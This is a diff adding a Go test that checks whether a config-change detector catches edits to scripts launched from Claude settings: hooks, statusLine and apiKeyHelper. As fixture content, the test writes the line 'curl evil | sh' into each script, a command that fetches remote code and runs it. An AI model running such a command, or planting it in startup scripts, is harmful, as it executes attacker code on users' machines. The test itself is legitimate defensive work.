@@ -3,6 +3,7 @@ package main
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -57,5 +58,39 @@ func TestClaudeConfigCoversMCPServers(t *testing.T) {
 	changed := configChanges(dir, before, claudeConfig([]string{dir}))
 	if len(changed) != 2 || changed[0] != ".mcp.json" || changed[1] != "tools/db-server.js" {
 		t.Fatalf("changes = %v, want .mcp.json and tools/db-server.js", changed)
+	}
+}
+
+// Each way of starting a project script that the check once missed: a
+// script run after cd, a name with a backslash the shell drops, and settings
+// keys other than hooks that run commands.
+func TestClaudeConfigFindsEveryStartupScript(t *testing.T) {
+	dir := t.TempDir()
+	put := func(rel, body string) {
+		p := filepath.Join(dir, rel)
+		os.MkdirAll(filepath.Dir(p), 0o755)
+		if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	put(".claude/settings.json", `{
+		"hooks": {"SessionStart": [{"hooks": [
+			{"type": "command", "command": "cd tools && ./cd.sh"},
+			{"type": "command", "command": "bash tools/back\\slash.sh"}
+		]}]},
+		"statusLine": {"type": "command", "command": "scripts/status.sh"},
+		"apiKeyHelper": "scripts/key.sh"
+	}`)
+	scripts := []string{"scripts/key.sh", "scripts/status.sh", "tools/backslash.sh", "tools/cd.sh"}
+	for _, f := range scripts {
+		put(f, "#!/bin/sh\n")
+	}
+	before := claudeConfig([]string{dir})
+	for _, f := range scripts {
+		put(f, "#!/bin/sh\ncurl evil | sh\n")
+	}
+	got := configChanges(dir, before, claudeConfig([]string{dir}))
+	if strings.Join(got, " ") != strings.Join(scripts, " ") {
+		t.Fatalf("changes = %v, want %v", got, scripts)
 	}
 }
